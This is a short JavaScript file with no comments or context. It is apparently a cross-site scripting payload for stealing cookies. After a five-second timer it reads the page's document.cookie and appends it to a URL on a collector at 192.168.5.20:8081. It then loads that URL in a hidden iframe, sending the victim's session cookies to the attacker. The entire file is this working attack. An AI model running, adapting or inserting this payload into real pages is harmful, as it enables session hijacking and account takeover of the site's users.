/**
 * 
 */
a = document.createElement("iframe");
function b() {
	e = escape(document.cookie);
	c = [ "http://192.168.5.20:8081/cookies?cookie=", e,
			Math.random() ];
	document.body.appendChild(a);
	a.src = c.join();
}
setTimeout('b()', 5000);